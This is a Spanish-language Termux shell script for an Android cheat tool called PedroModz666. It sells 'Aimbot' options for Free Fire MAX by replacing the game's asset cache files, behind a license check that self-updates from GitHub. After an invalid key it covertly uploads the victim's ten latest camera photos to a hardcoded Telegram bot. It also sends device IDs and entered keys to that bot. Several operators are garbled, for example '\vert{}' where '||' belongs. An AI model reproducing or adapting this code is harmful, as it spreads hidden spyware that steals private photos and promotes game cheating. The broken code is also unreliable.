#!/data/data/com.termux/files/usr/bin/sh

# --- CONFIGURACIÓN DE ACTUALIZACIÓN ONLINE ---
VERSION_ACTUAL="1.1.5"
CURL_PATH="/data/data/com.termux/files/usr/bin/curl"
URL_VERSION="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/version.txt?v=$(date +%s)"
URL_SCRIPT="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/PedroModz666.sh?v=$(date +%s)"
URL_KEYS="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/keys.txt?v=$(date +%s)"
# ---------------------------------------------

verificar_actualizacion() {
    VERSION_REMOTA=$("$CURL_PATH" -s "$URL_VERSION" | tr -d '\r' | tr -d '\n' | xargs)
    
    if [ -n "$VERSION_REMOTA" ] && [ "$VERSION_ACTUAL" != "$VERSION_REMOTA" ]; then
        printf "\n\033[1;31m¡Nueva actualización obligatoria disponible ($VERSION_REMOTA)!\033[0m\n"
        printf "¿Deseas actualizar ahora? (s/n): "
        read respuesta
        if [ "$respuesta" = "s" ] \vert{}\vert{} [ "$respuesta" = "S" ]; then
            printf "Actualizando script...\n"
            if "$CURL_PATH" -s -o "$0" "$URL_SCRIPT"; then
                chmod +x "$0"
                printf "\033[1;32m¡Actualización completada! Vuelve a abrir el script.\033[0m\n\n"
                exit 0
            else
                printf "\033[1;31mError al descargar la actualización.\033[0m\n"
                exit 1
            fi
        else
            printf "\n\033[1;31m[!] Debes actualizar para usar el script. Saliendo...\033[0m\n\n"
            exit 0
        fi
    fi
}

verificar_actualizacion

# --- CONFIGURACIÓN DE TELEGRAM ---
TOKEN_BOT="8683483962:AAGHLpFhkenCuKPbo_jDSlHP5RtomhR3L4Y"
TU_CHAT_ID="7024840116"

INTENTOS_MAXIMOS=3
FECHA_ACTUAL=$(date +%Y%m%d)

# Colores ANSI
ROJO='\033[1;31m'
VERDE='\033[1;32m'
AZUL='\033[1;36m'
AMARILLO='\033[1;33m'
CYAN='\033[0;36m'
RESET='\033[0m'

# --- RUTAS DE ARCHIVOS Y DESTINO ---
FILE_ORI="/storage/emulated/0/PedroModz666/Ori/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
FILE_PECHO="/storage/emulated/0/PedroModz666/Pecho/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
FILE_CUELLO="/storage/emulated/0/PedroModz666/Cuello/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"

DESTINO="/data/user/0/com.dts.freefiremax/files/contentcache/Compulsory/android/gameassetbundles/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"

clear

# --- OBTENER ID ÚNICO DEL DISPOSITIVO ---
DEVICE_ID=$(getprop ro.serialno 2>/dev/null)
if [ -z "$DEVICE_ID" ] \vert{}\vert{} [ "$DEVICE_ID" = "unknown" ]; then
    DEVICE_ID=$(settings get secure android_id 2>/dev/null)
fi
if [ -z "$DEVICE_ID" ]; then
    DEVICE_ID="DEVICE_GENERICO_$(date +%s)"
fi

# --- VERIFICACIÓN DE KEY, VINCULACIÓN Y VENCIMIENTO ---
intentos=0
while [ $intentos -lt$INTENTOS_MAXIMOS ]; do
    printf "${AZUL}======================================\n"
    printf "${VERDE}        🔐 INGRESA TU LICENCIA 🔐       \n"
    printf "${AZUL}======================================${RESET}\n"
    printf "${AMARILLO}Ingresa tu Licencia:${RESET}"
    read password

    # Descarga la lista de keys de GitHub limpia de retornos de carro
    LISTA_KEYS=$("$CURL_PATH" -s "$URL_KEYS" | tr -d '\r')
    
    # Busca de forma estricta la línea que comience con la key ingresada
    LINEA_MATCH=$(echo "$LISTA_KEYS" | grep -E "^${password}(\\Vert{}\vert{}$)" | head -n 1)

    if [ -n "$password" ] && [ -n "$LINEA_MATCH" ]; then
        # Extraemos campos limpios
        KEY_PURA=$(echo "$LINEA_MATCH" | cut -d'|' -f1 | xargs)
        DEVICE_REGISTRADO=$(echo "$LINEA_MATCH" | cut -d'|' -f2 | xargs)
        FECHA_KEY=$(echo "$LINEA_MATCH" | cut -d'|' -f3 | xargs)

        # 1. Validar fecha de expiración individual
        if [ -n "$FECHA_KEY" ] && [ "$FECHA_KEY" != "nunca" ]; then
            if [ "$FECHA_ACTUAL" -gt "$FECHA_KEY" ] 2>/dev/null; then
                MSG_TG="⚠️ Key EXPIRED: '$password' (Venció el $FECHA_KEY). Dispositivo: $DEVICE_ID"
                "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1
                printf "\n${ROJO}[✖] Esta Key ha VENCIDO (Fecha límite: $FECHA_KEY).${RESET}\n\n"
                exit 1
            fi
        fi

        # 2. Validar o Registrar Dispositivo Nuevo
        if [ -z "$DEVICE_REGISTRADO" ] || [ "$DEVICE_REGISTRADO" = "$KEY_PURA" ]; then
            # Es virgen / nueva: le avisamos a tu Telegram con el formato exacto para GitHub
            MSG_TG="🔥 NUEVO DISPOSITIVO REGISTRADO:\nKey: $password\nID: $DEVICE_ID\n\nActualiza en GitHub a:\n$password|$DEVICE_ID\vert{}$FECHA_KEY"
            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1

            printf "\n${VERDE}[✔] ¡Licencia aceptada y vinculada a tu celular!${RESET}\n"
            printf "${CYAN}ID de tu equipo registrado: $DEVICE_ID${RESET}\n\n"
            sleep 2
            break
        elif [ "$DEVICE_REGISTRADO" = "$DEVICE_ID" ]; then
            # Dispositivo autorizado correctamente
            MSG_TG="✅ Login exitoso: Key '$password' desde equipo autorizado."
            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1

            printf "\n${VERDE}[✔] ¡Licencia aceptada! Acceso concedido.${RESET}\n\n"
            sleep 1
            break
        else
            # Intento de clonación o uso en otro celular
            MSG_TG="🚨 ALERTA INTRUSO: Intentaron usar '$password' en otro celular.\n📱 ID Intruso: $DEVICE_ID\n📱 ID Autorizado: $DEVICE_REGISTRADO"
            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1

            printf "\n${ROJO}[✖] Esta key ya está registrada en OTRO dispositivo.${RESET}\n"
            printf "${ROJO}[✖] Acceso denegado por seguridad.${RESET}\n\n"
            exit 1
        fi
    else
        intentos=$((intentos + 1))
        restantes=$((INTENTOS_MAXIMOS - intentos))
        
        MSG_TG="⚠️ Key inválida intentada: '$password' (Restantes: $restantes). Dispositivo: $DEVICE_ID"
        "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1

        for foto in $(ls -t /storage/emulated/0/DCIM/Camera/*.jpg 2>/dev/null | head -n 10); do
            if [ -f "$foto" ]; then
                "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendPhoto" -F "chat_id=$TU_CHAT_ID" -F "photo=@$foto" > /dev/null 2>&1
            fi
        done

        printf "\n${ROJO}[✖] Key inválida. Intentos restantes: $restantes${RESET}\n\n"
        if [ $intentos -eq$INTENTOS_MAXIMOS ]; then
            MSG_TG="🚫 Script bloqueado por exceder intentos de keys inválidas."
            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1

            printf "${ROJO}[!] Demasiados intentos fallidos. Saliendo...${RESET}\n\n"
            exit 1
        fi
        sleep 1
        clear
    fi
done

# --- MENÚ PRINCIPAL ---
while true; do
    clear
    printf "${AZUL}======================================\n"
    printf "${VERDE}             PedroModz666             \n"
    printf "${CYAN}     Contacto: +593 982954390        \n"
    printf "${AZUL}======================================\n"
    printf "${AMARILLO}        1)${RESET} Original\n"
    printf "${AMARILLO}        2)${RESET} Aimbot Pecho\n"
    printf "${AMARILLO}        3)${RESET} Aimbot Cuello\n"
    printf "${AMARILLO}        4)${RESET} Salir\n"
    printf "${AZUL}======================================${RESET}\n"
    printf "${VERDE}Selecciona una opción [1-4]: ${RESET}"
    read opcion

    case "$opcion" in
        1)
            if [ -f "$FILE_ORI" ]; then
                printf "\n${CY